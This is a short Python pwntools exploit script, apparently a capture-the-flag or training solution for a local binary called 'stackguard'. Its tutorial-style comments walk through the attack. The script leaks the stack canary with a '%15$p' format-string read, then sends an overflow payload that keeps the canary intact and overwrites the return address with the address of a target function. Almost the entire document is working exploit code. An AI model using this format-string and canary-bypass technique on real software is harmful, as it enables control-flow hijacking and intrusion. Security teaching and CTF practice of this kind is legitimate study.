#!/usr/bin/env python
from pwn import *

r = process('./stackguard')

canary_protect_me = 0x0804854d

#we try padding to stack terminated
#we find that the position of canary is at 15
r.sendline('%15$p')

#the result we get from recv is string
#we use int,16 to change it to integer with hexidecimal base
#e.g. int('0x10',16) = 16
canary = int(r.recv(),16)

#with hex we can change it back to the number with hex base
print hex(canary)

#please draw picture of stack, and you can realize what we are doing
#After we get the canary, we need to make sure how much padding we need to overwrite ret address
#remember power of gdb
r.sendline('A'*40+p32(canary)+'A'*12+p32(canary_protect_me))
r.interactive()

